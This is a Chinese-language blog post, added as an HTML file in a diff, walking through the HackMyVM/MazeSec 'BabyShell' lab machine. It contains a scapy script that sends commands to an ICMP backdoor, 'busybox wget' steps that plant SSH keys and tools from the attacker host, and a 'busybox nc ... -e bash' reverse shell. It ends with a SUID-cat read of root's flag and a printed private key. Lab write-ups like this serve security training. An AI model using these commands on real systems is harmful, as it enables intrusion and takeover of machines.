@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>the0n3 - MazeSec BabyShell</title>
+        <meta name="description" content="the0n3">
+            <link rel="canonical" href="https://blog.the0n3.top">
+        <script>
+        (function () {
+            try {
+                var key = 'theme';
+                var saved = localStorage.getItem(key);
+                var theme = (saved === 'dark' || saved === 'light') ? saved : 'light';
+                document.documentElement.setAttribute('data-theme', theme);
+                document.documentElement.style.colorScheme = theme;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+                document.documentElement.style.colorScheme = 'light';
+            }
+        })();
+    </script>
+    <!-- 使用 GitHub Markdown 样式 -->
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/site.css">
+            <link rel="stylesheet" href="/assets/css/reading-progress.css">
+            <link rel="stylesheet" href="/assets/css/image-enhance.css">
+        <link rel="stylesheet" href="/assets/css/nav-reveal.css">
+    <!-- 代码高亮样式 -->
+    <link rel="stylesheet" href="/assets/prism/prism.css">
+</head>
+<body>
+        <div class="reading-progress" aria-hidden="true">
+        <div class="reading-progress__bar"></div>
+    </div>
+        <header>
+        <nav>
+            <div class="nav-right">
+                <a href="/">首页</a>
+                <a href="/archives">归档</a>
+                <a href="/categories">分类</a>
+                <a href="/tags">标签</a>
+            </div>
+        </nav>
+    </header>
+                <div class="page-layout">
+            <main class="markdown-body">
+                
+<article class="post-content">
+    <h1>MazeSec BabyShell</h1>
+    <p>
+        <span class="meta">发布于: 2025-11-10 02:10</span>
+    </p>
+    <div class="post-body">
+        <h2>信息收集</h2>
+<h3>主机发现与 ARP 扫描</h3>
+<p>存活主机发现</p>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~/hackmyvm/BabyShell]
+└─$ sudo arp-scan -I eth1 192.168.56.0/24
+
+192.168.56.124  08:00:27:d2:34:03       PCS Systemtechnik GmbH</code></pre>
+<h3>TCP 全端口扫描与服务识别</h3>
+<p>tcp全端口扫描</p>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~/hackmyvm/BabyShell]
+└─$ nmap -p- -sT 192.168.56.124          
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http</code></pre>
+<h3>80 端口 HTTP 服务</h3>
+<p>扫描目录，存在备份文件</p>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~/hackmyvm/BabyShell]
+└─$ dirsearch -u http://192.168.56.124/
+
+  _|. _ _  _  _  _ _|_    v0.4.3.post1
+ (_||| _) (/_(_|| (_| )
+
+
+Target: http://192.168.56.124/
+
+[19:43:26] 200 -    1KB - /backup.zip
+
+Task Completed</code></pre>
+<h3>后门分析</h3>
+<p>解压备份文件，审计可以知道是一份 python实现的 icmp 后门</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+TRIGGER_SEQUENCE = b"Mazesec"
+LISTEN_INTERFACE = "enp0s3"
+SERVER_IP = "0.0.0.0"
+
+class ICMPServer:
+    def __init__(self):
+        self.running = True
+        self.client_ips = {}
+
+    def signal_handler(self, sig, frame):
+        print("\n[!] Stopping server...")
+        self.running = False
+        sys.exit(0)
+
+    def execute_command_as_user(self, command, uid=1000, timeout=30):
+        # 隐藏
+    def parse_icmp_command(self, packet_data):
+        try:
+            trigger_len = len(TRIGGER_SEQUENCE)
+            if len(packet_data) &lt; trigger_len + 4:
+                return None
+
+            if packet_data[:trigger_len] != TRIGGER_SEQUENCE:
+                return None
+
+            cmd_len = struct.unpack('&gt;I', packet_data[trigger_len:trigger_len+4])[0]
+
+            if cmd_len &lt;= 0 or cmd_len &gt; 4096:
+                return None
+
+            if len(packet_data) &lt; trigger_len + 4 + cmd_len:
+                return None
+
+            command = packet_data[trigger_len+4:trigger_len+4+cmd_len].decode('utf-8', errors='ignore')
+            return command
+
+        except Exception as e:
+            print(f"[-] Parse error: {e}")
+            return None</code></pre>
+<p>脚本会解析 icmp 数据包，寻找特定的触发序列 "Mazesec"，并提取后续的命令数据。数据包格式如下：</p>
+<pre><code class="language-plaintext">[TRIGGER_SEQUENCE][4字节长度][命令数据]
+├───────────────├──────────├──────────┤
+  固定长度        大端整数   变长数据</code></pre>
+<h2>后门利用</h2>
+<p>拷打 AI 写个利用脚本</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+import sys
+import struct
+from scapy.all import IP, ICMP, Raw, send
+
+TRIGGER = b"Mazesec"
+
+if len(sys.argv) != 3:
+    sys.exit(0)
+TARGET = sys.argv[1]
+COMMAND = sys.argv[2]
+CMD_BYTES = COMMAND.encode('utf-8', errors='ignore')
+CMD_LEN = len(CMD_BYTES)
+PAYLOAD = TRIGGER + struct.pack('&gt;I', CMD_LEN) + CMD_BYTES
+PACKET = IP(dst=TARGET) / ICMP(type=8, id=0xFACE, seq=1) / Raw(load=PAYLOAD)
+send(PACKET, verbose=0)</code></pre>
+<p><code>ip a</code>命令找到靶机所在网段的网卡</p>
+<p><img src="/images/maze-babyshell/1.png" alt=""></p>
+<p>tcpdump 指定网卡，抓取icmp数据包</p>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~/hackmyvm/BabyShell]
+└─$ sudo tcpdump -i eth1 -A -n icmp
+
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on eth1, link-type EN10MB (Ethernet), snapshot length 262144 bytes</code></pre>
+<p><img src="/images/maze-babyshell/2.png" alt=""></p>
+<p>利用脚本发送命令，需要 sudo 权限</p>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~/hackmyvm/BabyShell]
+└─$ sudo python3 rce.py 192.168.56.124 id
+</code></pre>
+<p><img src="/images/maze-babyshell/3.png" alt=""></p>
+<p>靶机返回的 icmp 数据包里有命令执行的结果，这个后门是 <code>zero</code> 用户在运行</p>
+<p><img src="/images/maze-babyshell/4.png" alt=""></p>
+<h2>ssh 登录 zero 用户</h2>
+<p>从攻击机下载公钥到 zero 用户的 .ssh 目录</p>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~/hackmyvm/BabyShell]
+└─$ sudo python3 rce.py 192.168.56.124 "mkdir -p /home/zero/.ssh"
+
+┌──(npc㉿kali)-[~/hackmyvm/BabyShell]
+└─$ sudo python3 rce.py 192.168.56.124 "busybox wget http://192.168.56.100/pentest.pub -O /home/zero/.ssh/authorized_keys"
+
+┌──(npc㉿kali)-[~/hackmyvm/BabyShell]
+└─$ sudo python3 rce.py 192.168.56.124 "chmod 600 /home/zero/.ssh/authorized_keys"  </code></pre>
+<p><img src="/images/maze-babyshell/5.png" alt=""></p>
+<h3>sudo 权限枚举</h3>
+<p>sudo 需要密码，剧终</p>
+<pre><code class="language-bash">zero@BabyShell:~$ sudo -l
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+[sudo] password for zero: 
+sudo: a password is required</code></pre>
+<h3>内网服务转发</h3>
+<p>查看本地服务端口，存在一个8080端口的服务，不对外开放</p>
+<pre><code class="language-bash">zero@BabyShell:~$ ss -tupln
+Netid                   State                    Recv-Q                   Send-Q                                     Local Address:Port                                     Peer Address:Port                   
+udp                     UNCONN                   0                        0                                                0.0.0.0:68                                            0.0.0.0:*                      
+tcp                     LISTEN                   0                        5                                              127.0.0.1:8080                                          0.0.0.0:*                      
+tcp                     LISTEN                   0                        128                                              0.0.0.0:22                                            0.0.0.0:*                      
+tcp                     LISTEN                   0                        128                                                    *:80                                                  *:*                      
+tcp                     LISTEN                   0                        128                                                 [::]:22                                               [::]:*     </code></pre>
+<p>从攻击机下载 socat ，把8080端口转发到8000端口</p>
+<pre><code class="language-bash">zero@BabyShell:~$ wget http://192.168.56.100/socat -O ./socat
+-bash: wget: command not found
+zero@BabyShell:~$ busybox wget http://192.168.56.100/socat -O ./socat
+Connecting to 192.168.56.100 (192.168.56.100:80)
+socat                100% |****************************************************************************************************************************************************************|  366k  0:00:00 ETA
+zero@BabyShell:~$ chmod +x ./socat
+zero@BabyShell:~$ nohup ./socat TCP-LISTEN:8000,bind=0.0.0.0,fork TCP:127.0.0.1:8080 &amp;
+[1] 280070
+zero@BabyShell:~$ nohup: ignoring input and appending output to 'nohup.out'
+zero@BabyShell:~$ </code></pre>
+<p><img src="/images/maze-babyshell/6.png" alt=""></p>
+<h3>8080 端口 Web 服务</h3>
+<p>访问 8000 端口，没有任何内容</p>
+<p><img src="/images/maze-babyshell/7.png" alt=""></p>
+<p>dirseach 扫描目录</p>
+<p><img src="/images/maze-babyshell/8.png" alt=""></p>
+<p>dirsearch 有个排除返回内容大小的参数<code>--exclude-sizes 0B</code>，排除空页面，还是没有结果</p>
+<p><img src="/images/maze-babyshell/9.png" alt=""></p>
+<p>gobuster 扫描目录，排除空页面</p>
+<pre><code class="language-bash">gobuster dir -u http://192.168.56.124:8000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,asp,txt,bak --exclude-length 0</code></pre>
+<p>扫到一个名为 execute 的页面</p>
+<p><img src="/images/maze-babyshell/10.png" alt=""></p>
+<p>需要一个 cmd 参数，尝试 get 执行 whoami 命令，tom 用户在运行这个服务</p>
+<p><img src="/images/maze-babyshell/11.png" alt=""></p>
+<p><img src="/images/maze-babyshell/12.png" alt=""></p>
+<p>busybox 反弹个 shell 过来，再下载 攻击机提供的私钥，使用 ssh 连接</p>
+<p>反弹shell</p>
+<pre><code class="language-bash">busybox nc 192.168.56.100 5555 -e bash</code></pre>
+<p>下载远程公钥</p>
+<pre><code class="language-bash">mkdir -p /home/tom/.ssh
+busybox wget http://192.168.56.100/pentest.pub -O /home/tom/.ssh/authorized_keys
+chmod 600 /home/tom/.ssh/authorized_keys</code></pre>
+<h3>ssh 登录到 tom 用户</h3>
+<p>ssh 登录到 tom 用户</p>
+<p><img src="/images/maze-babyshell/13.png" alt=""></p>
+<p>tom 用户家目录有suid 的猫</p>
+<p>可以直接 查看flag</p>
+<pre><code class="language-bash">tom@BabyShell:~$ ls -lah
+total 76K
+drwx------ 3 tom  tom  4.0K Nov  8 08:37 .
+drwxr-xr-x 4 root root 4.0K Nov  7 21:53 ..
+-rw------- 1 tom  tom   999 Nov  8 09:06 .bash_history
+-rw-r--r-- 1 tom  tom   220 Nov  7 21:53 .bash_logout
+-rw-r--r-- 1 tom  tom  3.5K Nov  7 21:53 .bashrc
+-rwsr-sr-x 1 root root  43K Nov  8 04:13 cat
+-rw-r--r-- 1 tom  tom   807 Nov  7 21:53 .profile
+-rw-r--r-- 1 tom  tom    45 Nov  8 08:35 shell.sh
+drwxr-xr-x 2 tom  tom  4.0K Nov  8 08:37 .ssh
+tom@BabyShell:~$ ./cat /root/root.txt
+flag{root-c793411fbdda37f03fd27470d763433b}</code></pre>
+<p><img src="/images/maze-babyshell/14.png" alt=""></p>
+<h2>root 提权</h2>
+<p>suid 的命令可以读取 root 文件，flag文件名 root.txt 改名怎么查看？通配符！</p>
+<p>脑子一热上耻辱柱了</p>
+<p><img src="/images/maze-babyshell/15.png" alt=""></p>
+<p>通配符<code>*</code>、<code>?</code>，替换命令<code>$()</code>、重定向管道<code>&lt;&gt;</code>，进程替换<code>&lt;()</code>、管道符<code>|</code>这些实际都作用在当前用户权限下的 shell 里</p>
+<p>在当前 tom 用户的shell 环境下，通配符只解析 tom 用户有权限访问的文件，不能用户模糊匹配 root 用户的文件，只能完整路径完整文件名读取</p>
+<pre><code class="language-bash">./cat /root/*</code></pre>
+<p>可以尝试读取 root 用户的私钥，然后使用 ssh 登录 root 用户</p>
+<p>没有 <code>id_rsa</code> 文件</p>
+<pre><code class="language-bash">tom@BabyShell:~$ ./cat /root/.ssh/id_rsa
+./cat: /root/.ssh/id_rsa: No such file or directory</code></pre>
+<p>还可以再尝试其他的私钥文件名，查看 ssh 配置文件</p>
+<p>在 ssh_config 里默认的私钥文件名</p>
+<p><img src="/images/maze-babyshell/16.png" alt=""></p>
+<p>一般会尝试 <code>id_rsa</code> 私钥文件名，因为 <code>ssh-keygen</code> 默认使用 rsa 算法 ，生成的默认私钥文件名就是 <code>id_rsa</code>，生成时可以使用 <code>-f</code> 参数指定私钥文件名，<code>-t</code> 参数指定密钥类型，如果是 ed25519 算法，默认私钥文件名就是 <code>id_ed25519</code></p>
+<p><img src="/images/maze-babyshell/17.png" alt=""></p>
+<p>在 sshd_config 配置文件里公钥文件名比较固定，一般是<code>authorized_keys</code>、<code>authorized_keys2</code></p>
+<p><img src="/images/maze-babyshell/18.png" alt=""></p>
+<p>可以先尝试读取公钥，在公钥里看到 使用的算法是 ed25519，私钥可能是 <code>id_ed25519</code></p>
+<pre><code class="language-bash">tom@BabyShell:~$ ./cat /root/.ssh/authorized_keys
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHLjmqMYftQPxAe5qMzjo00oTUjltQebZj2PLfqPg00y root@BabyShell</code></pre>
+<p>读取私钥，ssh 登录 root 用户</p>
+<pre><code class="language-bash">tom@BabyShell:~$ ./cat /root/.ssh/id_ed25519
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACBy45qjGH7UD8QHuajM46NNKE1I5bUHm2Y9jy36j4NNMgAAAJin4qUip+Kl
+IgAAAAtzc2gtZWQyNTUxOQAAACBy45qjGH7UD8QHuajM46NNKE1I5bUHm2Y9jy36j4NNMg
+AAAEB3Tt9WPUVP+/ghSIb83N1USifSsg+29ZhP1Mfh/TS6r3LjmqMYftQPxAe5qMzjo00o
+TUjltQebZj2PLfqPg00yAAAADnJvb3RAQmFieVNoZWxsAQIDBAUGBw==
+-----END OPENSSH PRIVATE KEY-----
+tom@BabyShell:~$ vim .ssh/id_ed25519
+tom@BabyShell:~$ chmod 600 .ssh/id_ed25519 
+tom@BabyShell:~$ ssh root@localhost
+Linux BabyShell 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sat Nov  8 03:52:57 2025 from 192.168.3.94
+root@BabyShell:~# </code></pre>
+<p><img src="/images/maze-babyshell/19.png" alt=""></p>
+<p>欸？你问我使用的不是 id_rsa 私钥为什么可以不使用 <code>-i</code> 参数指定私钥文件直接登录？我偷偷配置 <code>.ssh/config</code> 文件指定私钥了吗？</p>
+<p>config文件在ssh 客户端，服务端不需要这个文件</p>
+<p><img src="/images/maze-babyshell/21.png" alt=""></p>
+<p>ssh 客户端会自动尝试使用所有默认的私钥文件名进行认证登录</p>
+<p><img src="/images/maze-babyshell/20.png" alt=""></p>
+<p>如果私钥真的是一个自定义的文件名呢💔</p>    </div>
+        <div class="post-meta-footer">
+                    <span class="post-meta-item">分类:
+                                    <span>渗透</span>
+                            </span>
+                            <span class="post-meta-item">标签:
+                                    <span>#icmp</span>
+                                    <span>#command injection</span>
+                                    <span>#id_ed25519</span>
+                            </span>
+            </div>
+    </article>
+
+            </main>
+                <aside class="post-toc" aria-label="Table of contents">
+        <div class="toc-title">目录</div>
+        <nav class="toc-list"></nav>
+    </aside>
+            </div>
+        <button id="backToTop" class="fab fab-top" type="button" aria-label="返回顶部" title="返回顶部">↑</button>
+    <button id="themeToggle" class="theme-toggle" type="button" aria-label="切换主题" title="切换主题"></button>
+    <script src="/assets/js/site.js"></script>
+        <script src="/assets/js/navReveal.js"></script>
+        <script src="/assets/js/readingProgress.js"></script>
+            <script src="/assets/js/imageEnhance.js"></script>
+        <!-- 启动代码高亮及行号显示 -->
+    <script src="/assets/prism/prism.js"></script>
+    <script src="/assets/prism/prism-line-number.js"></script>
+    <!-- 主题切换 -->
+    <script src="/assets/js/ThemeSwitch.js"></script>
+</body>
+</html>
